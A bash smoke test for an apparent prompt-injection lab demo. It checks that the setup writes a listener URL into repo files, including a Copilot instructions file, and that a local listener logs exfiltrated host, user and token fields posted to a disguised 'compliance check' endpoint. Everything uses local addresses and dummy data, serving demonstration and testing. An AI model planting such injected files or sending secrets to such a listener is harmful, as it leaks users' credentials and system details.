#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEMP_ROOT="$(mktemp -d)"
TEMP_DEMO="$TEMP_ROOT/demo"
LISTENER_PID=""

cleanup() {
    if [[ -n "$LISTENER_PID" ]]; then
        kill "$LISTENER_PID" 2>/dev/null || true
        wait "$LISTENER_PID" 2>/dev/null || true
    fi
    rm -rf "$TEMP_ROOT"
}
trap cleanup EXIT

cp -R "$SCRIPT_DIR" "$TEMP_DEMO"
rm -f "$TEMP_DEMO/repo/.env" "$TEMP_DEMO"/logs/exfil_*.log

SMOKE_PORT="${SMOKE_PORT:-$(python3 - <<'PY'
import socket

with socket.socket() as sock:
    sock.bind(("127.0.0.1", 0))
    print(sock.getsockname()[1])
PY
)}"

LISTENER_HOST=127.0.0.1 LISTENER_PORT="$SMOKE_PORT" DEMO_MODEL=test/smoke-model \
    "$TEMP_DEMO/run-demo.sh" >/dev/null

[[ -f "$TEMP_DEMO/repo/.env" ]] || {
    echo "Smoke test failed: setup did not create repo/.env" >&2
    exit 1
}

payload_files=(
    "$TEMP_DEMO/repo/README.md"
    "$TEMP_DEMO/repo/TODO.md"
    "$TEMP_DEMO/repo/src/app.py"
    "$TEMP_DEMO/repo/.github/copilot-instructions.md"
)
for file in "${payload_files[@]}"; do
    grep -Fq "http://127.0.0.1:${SMOKE_PORT}/" "$file" || {
        echo "Smoke test failed: listener URL was not written to $file" >&2
        exit 1
    }
done

LISTEN_HOST=127.0.0.1 LISTEN_PORT="$SMOKE_PORT" \
    "$TEMP_DEMO/listener.sh" >"$TEMP_ROOT/listener.out" 2>&1 &
LISTENER_PID=$!

ready=false
for _ in {1..50}; do
    if curl -fsS "http://127.0.0.1:${SMOKE_PORT}/health" >/dev/null 2>&1; then
        ready=true
        break
    fi
    sleep 0.1
done
if [[ "$ready" != true ]]; then
    echo "Smoke test failed: listener did not become ready" >&2
    exit 1
fi

response="$(curl -fsS -X POST "http://127.0.0.1:${SMOKE_PORT}/register" \
    --data-urlencode "app=smoke-test" \
    --data-urlencode "hostname=demo-host" \
    --data-urlencode "user=demo-user" \
    --data-urlencode "config=DEMO_TOKEN=abcd****")"
[[ "$response" == "compliance_check_received" ]] || {
    echo "Smoke test failed: unexpected listener response" >&2
    exit 1
}

kill "$LISTENER_PID" 2>/dev/null || true
wait "$LISTENER_PID" 2>/dev/null || true
LISTENER_PID=""

logs=("$TEMP_DEMO"/logs/exfil_*.log)
[[ -f "${logs[0]}" ]] || {
    echo "Smoke test failed: listener log was not created" >&2
    exit 1
}
grep -Fq "app=smoke-test" "${logs[0]}"
grep -Fq "hostname=demo-host" "${logs[0]}"
grep -Fq "user=demo-user" "${logs[0]}"
grep -Fq "config=DEMO_TOKEN=abcd****" "${logs[0]}"

"$TEMP_DEMO/clean.sh" >/dev/null
for file in "${payload_files[@]}"; do
    grep -Fq "http://LAB_HOST:18888/" "$file" || {
        echo "Smoke test failed: reset did not restore $file" >&2
        exit 1
    }
    if grep -Fq "http://127.0.0.1:${SMOKE_PORT}/" "$file"; then
        echo "Smoke test failed: custom listener URL remains in $file" >&2
        exit 1
    fi
done

echo "Demo smoke test passed."
